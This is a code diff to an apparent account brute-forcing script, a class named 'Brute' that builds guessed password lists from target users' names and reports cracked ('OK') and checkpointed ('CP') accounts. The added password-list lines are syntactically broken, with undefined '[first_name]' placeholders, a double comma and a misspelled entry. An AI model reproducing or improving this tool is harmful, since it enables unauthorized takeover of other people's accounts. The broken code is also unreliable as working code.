@@ -70,7 +70,7 @@ class Brute:
 						break
 				except: pass
 				sys.stdout.write(
-					'\r[\033[0;96m{}\033[0m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
+					'\r[\033[0;96m{}\033[91;1m] Cracking {}/{} OK:-{} CP:-{} '.format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp))
 				); sys.stdout.flush()
 
 	def main(self):
@@ -88,8 +88,15 @@ class Brute:
 				obj = user['name'].split(' ')
 				if len(obj) == 1:
 					listpass = [
-						obj[0]+'123', obj[0]+'1234', 'sayang', 'doraemon', 'indonesia',
-						obj[0]+'12345', obj[0]+'sayang', 'anjing', 'bangsat',
+                                                     [first_name]+'123',
+                                                     [first_name]+'1234',
+                                                     [first_name]+'12345',
+                                                     [last_name]+'123',
+                                                     'sayang',
+                                                     'anjing',,
+                                                     'bangsat',
+                                                     'doraemom',
+                                                     'indonesia',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
